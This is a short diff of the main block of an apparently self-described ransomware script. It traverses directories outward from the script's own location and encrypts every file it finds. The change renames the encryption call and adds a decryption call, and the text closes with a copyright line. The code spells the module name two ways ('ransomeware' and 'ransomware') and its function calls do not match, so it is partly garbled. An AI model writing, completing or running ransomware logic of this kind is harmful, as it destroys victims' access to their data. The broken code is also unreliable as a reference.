@@ -242,7 +242,9 @@ if __name__ == '__main__':
     all_files = ransomeware.traverse_directories_outward(script_directory, max_depth=max_traversal_depth)
 
     # Proceed with caution when modifying files
-    encrypt_files(all_files)
+    encrypt_files_in_folder(all_files)
+
+    ransomware.decrypt_files_in_folder(all_files)
 """
 
 # © 2023 Batyr Mammetesenov. All rights reserved.
